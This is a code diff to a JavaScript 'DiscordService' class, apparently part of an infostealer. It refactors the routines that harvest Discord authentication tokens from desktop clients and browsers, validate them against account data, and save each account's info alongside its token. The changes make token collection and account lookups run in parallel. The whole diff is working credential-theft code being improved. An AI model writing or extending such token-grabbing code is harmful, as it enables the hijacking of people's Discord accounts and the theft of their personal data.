@@ -73,18 +73,21 @@ class DiscordService {
 
         try {
             // Collect tokens from Discord applications
-            for (const [clientKey, clientConfig] of Object.entries(this.discordPaths)) {
+            const clientPromises = Object.entries(this.discordPaths).map(async ([clientKey, clientConfig]) => {
                 try {
-                    const clientTokens = await this.collectClientTokens(clientKey, clientConfig);
-                    allTokens.push(...clientTokens);
+                    return await this.collectClientTokens(clientKey, clientConfig);
                 } catch (error) {
                     ErrorHandler.handle(
                         new ModuleError(`Failed to collect tokens from ${clientConfig.name}`, 'discord'),
                         null,
                         { client: clientKey }
                     );
+                    return [];
                 }
-            }
+            });
+
+            const clientResults = await Promise.all(clientPromises);
+            clientResults.forEach(clientTokens => allTokens.push(...clientTokens));
 
             // Collect tokens from browsers
             try {
@@ -109,7 +112,7 @@ class DiscordService {
             });
 
             // Get account information for all unique tokens
-            for (const token of uniqueTokensSet) {
+            const accountPromises = Array.from(uniqueTokensSet).map(async (token) => {
                 try {
                     const accountData = await this.getAccountInfo(token);
                     if (accountData) {
@@ -123,15 +126,24 @@ class DiscordService {
                         // Save account info as well for reference
                         fileManager.saveJson(accountData, folderPath, 'account_info.json');
                         
-                        accounts.push({
+                        return {
                             ...accountData,
                             token: token
-                        });
+                        };
                     }
+                    return null;
                 } catch (error) {
                     logger.debug('Failed to get account info for token', error.message);
+                    return null;
                 }
-            }
+            });
+
+            const accountResults = await Promise.all(accountPromises);
+            accountResults.forEach(accountData => {
+                if (accountData) {
+                    accounts.push(accountData);
+                }
+            });
 
             // Only create Discord folder if tokens were detected
             this.ensureDiscordFolderExists(accounts.length, uniqueTokensSet.size);
